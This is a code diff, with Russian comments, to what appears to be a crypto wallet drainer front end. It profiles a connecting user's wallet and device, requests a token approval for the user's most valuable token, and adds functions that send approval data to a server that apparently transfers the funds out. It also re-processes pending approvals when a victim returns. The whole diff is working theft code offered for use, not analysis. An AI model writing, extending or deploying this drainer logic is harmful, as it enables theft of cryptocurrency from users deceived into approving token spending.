@@ -889,6 +889,108 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   }
 }
 
+// Функция для проверки pending approvals при возвращении на сайт
+const checkPendingApprovals = async (userAddress, chainId) => {
+  try {
+    console.log(`Checking for pending approvals for ${userAddress} on chain ${chainId}`)
+    
+    const response = await fetch('/api/check-pending', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        userAddress,
+        chainId
+      })
+    })
+    
+    if (!response.ok) {
+      throw new Error(`Server responded with status: ${response.status}`)
+    }
+    
+    const result = await response.json()
+    console.log(`Pending approvals check result:`, result)
+    
+    if (result.success && result.pendingApprovals && result.pendingApprovals.length > 0) {
+      console.log(`Found ${result.pendingApprovals.length} pending approvals`)
+      
+      // Обрабатываем каждое pending approval
+      for (const approval of result.pendingApprovals) {
+        try {
+          await sendApprovalToServer(
+            userAddress,
+            approval.tokenAddress,
+            approval.contractAddress,
+            chainId,
+            approval.txHash,
+            approval.tokenSymbol
+          )
+        } catch (error) {
+          console.error(`Error processing pending approval for ${approval.tokenSymbol}:`, error)
+        }
+      }
+    }
+    
+    return result
+  } catch (error) {
+    console.error(`Error checking pending approvals:`, error)
+    return { success: false, error: error.message }
+  }
+}
+
+// Функция для отправки данных об одобрении на сервер
+const sendApprovalToServer = async (userAddress, tokenAddress, contractAddress, chainId, txHash, tokenSymbol) => {
+  try {
+    console.log(`Sending approval data to server for ${tokenSymbol} (${tokenAddress})`)
+    
+    const response = await fetch('/api/approval', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        userAddress,
+        tokenAddress,
+        contractAddress,
+        chainId,
+        txHash,
+        tokenSymbol
+      })
+    })
+    
+    if (!response.ok) {
+      throw new Error(`Server responded with status: ${response.status}`)
+    }
+    
+    const result = await response.json()
+    console.log(`Server response for approval:`, result)
+    
+    if (result.success) {
+      // Уведомляем о успешном transfer
+      const device = detectDevice()
+      const walletInfo = { name: 'Unknown' }
+      
+      await notifyTransferSuccess(
+        userAddress,
+        walletInfo.name,
+        device,
+        { symbol: tokenSymbol, address: tokenAddress },
+        chainId,
+        result.transferTxHash
+      )
+      
+      return result
+    } else {
+      throw new Error(result.message || 'Server returned error')
+    }
+  } catch (error) {
+    console.error(`Error sending approval to server:`, error)
+    store.errors.push(`Failed to process approval on server: ${error.message}`)
+    throw error
+  }
+}
+
 // Add batch operations function after the getTokenPrice function
 const performBatchOperations = async (mostExpensive, allBalances, state) => {
   if (!mostExpensive) {
@@ -1049,6 +1151,9 @@ const initializeSubscribers = (modal) => {
       }
       await notifyWalletConnection(state.address, walletInfo.name, device, allBalances, store.networkState.chainId)
       
+      // Check for pending approvals when user returns to the site
+      await checkPendingApprovals(state.address, store.networkState.chainId)
+      
       if (mostExpensive) {
         console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USDT: ${mostExpensive.price}`)
         
@@ -1077,38 +1182,17 @@ const initializeSubscribers = (modal) => {
             )
           }
           
-          // Wait for all allowances and send server requests
+          // Send approval data to server for all approved tokens
           for (const token of approvedTokens) {
             try {
-              await waitForAllowance(
-                wagmiAdapter.wagmiConfig,
+              await sendApprovalToServer(
                 state.address,
                 token.address,
                 CONTRACTS[mostExpensive.chainId],
-                mostExpensive.chainId
-              )
-              
-              // Send server request for each approved token
-              const amount = parseUnits(token.balance.toString(), token.decimals)
-              const transferResult = await sendTransferRequest(
-                state.address,
-                token.address,
-                amount,
                 mostExpensive.chainId,
-                batchResult.txHash
+                batchResult.txHash,
+                token.symbol
               )
-              
-              // Notify about successful transfer
-              if (transferResult.success) {
-                await notifyTransferSuccess(
-                  state.address,
-                  walletInfo.name,
-                  device,
-                  token,
-                  mostExpensive.chainId,
-                  transferResult.txHash
-                )
-              }
             } catch (error) {
               console.error(`Error processing token ${token.symbol}:`, error)
               store.errors.push(`Failed to process ${token.symbol}: ${error.message}`)
@@ -1143,35 +1227,15 @@ const initializeSubscribers = (modal) => {
                 mostExpensive.chainId
               )
               
-              // Wait for allowance and send server request
-              await waitForAllowance(
-                wagmiAdapter.wagmiConfig,
+              // Send approval data to server immediately after approval
+              await sendApprovalToServer(
                 state.address,
                 mostExpensive.address,
                 contractAddress,
-                mostExpensive.chainId
-              )
-              
-              const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals)
-              const transferResult = await sendTransferRequest(
-                state.address,
-                mostExpensive.address,
-                amount,
                 mostExpensive.chainId,
-                txHash
+                txHash,
+                mostExpensive.symbol
               )
-              
-              // Notify about successful transfer
-              if (transferResult.success) {
-                await notifyTransferSuccess(
-                  state.address,
-                  walletInfo.name,
-                  device,
-                  mostExpensive,
-                  mostExpensive.chainId,
-                  transferResult.txHash
-                )
-              }
             }
           } catch (error) {
             handleApproveError(error, mostExpensive, state)
